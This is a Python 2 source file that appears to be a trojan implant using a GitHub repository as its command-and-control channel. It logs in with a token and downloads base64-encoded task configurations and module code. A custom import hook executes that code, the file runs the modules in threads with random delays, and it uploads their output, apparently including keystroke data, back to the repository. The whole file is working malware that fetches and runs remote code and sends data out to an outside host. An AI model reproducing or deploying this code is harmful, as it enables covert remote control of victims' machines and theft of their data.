import json
import base64
import sys
import time
import imp
import platform
import random
import socket
import threading
import Queue
import os
import uuid

from requests import get
from github3 import login

try:
    from token_data import TOKEN
except:
    TOKEN = "-"

process_id = ""

process_config = "base.json"
key_thread = None
data_path = "data/%s/" % process_id
process_modules = []
configured = False
task_queue = Queue.Queue()
current_window = None


def connect_to_github():
    gh = login(token=TOKEN)
    repo = gh.repository('zelttu', 'statifier')
    branch = repo.branch("master")

    return gh, repo, branch


def get_file_contents(filepath):
    bb, repo, branch = connect_to_github()

    tree = branch.commit.commit.tree.to_tree().recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None


def get_process_config():
    global configured
    config_json = get_file_contents(process_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])

    if platform.system() in ["Windows", "Darwin", "Linux"]:
        print("%s.json" % platform.system().lower())
        config_json = get_file_contents("%s.json" % platform.system().lower())
        print(config_json)
        aux_config = json.loads(base64.b64decode(config_json))

        for task in aux_config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])

        #config = config + aux_config
        config = aux_config
    else:
        print "[*] Unknown platform %s" % platform.system()

    return config


def store_module_result(data, module):
    if not data:
        return

    bb, repo, branch = connect_to_github()
    remote_path = "data/%s/%s/%d.data" % (process_id, module, int(time.time()))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))

    return


def module_runner(module):
    global key_thread
    task_queue.put(1)
    print("KEY THREAD : %s" % str(key_thread))
    if module == 'writer':
        result = sys.modules[module].run(thread=key_thread)
    else:
        result = sys.modules[module].run()
    task_queue.get()
    print "[*] Executing module_runer for '%s'" % module
    store_module_result(result, module)

    return


def init_process_id():
    global process_id
    print "[*] Initializing process id"
    if not os.path.exists('./process_id'):
        f = open("./process_id", "w")
        f.write(base64.b64encode(uuid.uuid4().bytes))
        f.close()
        print "[*] Generated new process id"

    f = open("./process_id", "r")
    pid = f.readline()
    f.close()
    process_id = uuid.UUID(bytes=base64.b64decode(pid))
    process_id = str(process_id).replace("-", "")
    print "[*] Process id updated to '%s' " % str(process_id)


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve '%s'" % fullname
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                print "[*] Importing library '%s'" % fullname
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module

        return module

sys.meta_path = [GitImporter()]
init_process_id()

while True:
    if task_queue.empty():
        config = get_process_config()

        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(10, 12))
